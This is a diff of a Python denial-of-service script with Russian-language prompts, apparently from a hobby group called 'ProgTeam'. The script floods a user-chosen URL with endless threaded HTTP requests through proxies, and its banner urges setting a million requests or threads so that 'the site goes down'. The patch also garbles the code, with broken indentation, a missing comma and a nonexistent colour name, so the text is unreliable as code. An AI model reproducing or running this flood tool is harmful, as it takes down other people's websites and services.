@@ -71,19 +71,39 @@ def send (site, proxy):
 			while True:
 				#print (site, headers, prox)
 				requests.get (site, headers = headers, proxies = prox)
-				print (Fore.GREEN + 'Запрос на ' + site + ' Выполнен')
+				print (Fore.BLUE + 'Запрос на ' + site + ' Выполнен успешно')
 		except:
 			continue
 
 def main ():
-	print ('''
+print("""
+<python 3>
+    print(Fore.BLUE + ""Лабаратория 'ProgTeam' приветствует."")
+        </python 3>
+""")
+print(Fore.GREEN + """
+8888888888888
+88888888      888
+88         88        88
+88         88    8888
+88         88    8888
+88         88888888
+88                 88888
+88888888888888
+88888888888888""")
+print (Fore.BLUE + """
 Наш паблик вк vk.com/progteamlub
+ЦЕЛЬ 100 САБОВ! Мы вас любим♡♡♡""" + Fore.PINK + """
 
-DoS Top
-	''')
+Стандарт прокси: localhost
+Ставь 1000000 запросов и сайт ляжет.
+Удачи!!
 
-	site = input ('Введите url сайта: ')
-	thread = input ('Введите кол-во потоков (по умолчанию 500): ')
+>.:DoS top:.<
+	""")
+
+	site = input (Fore.BLUE + 'Введите url сайта: ')
+	thread = input (Fore.RED'Введите кол-во потоков (Выстови миллион и - сайт, удачи!)\n -->   ')
 	proxy = input ('Введите файл с proxy (или будут использоваться стандартные): ')
 
 	if thread.strip () == '':
@@ -103,7 +123,7 @@ DoS Top
 	except:
 		for t in thread_list:
 			t.join ()
-			print (Fore.RED + 'Все proxy заблокированы. DDoS остановлен...')
+			print (Fore.RED + 'Все proxy заблокированы. DoS остановлен...')
 
 if __name__ == '__main__':
 	clear ()
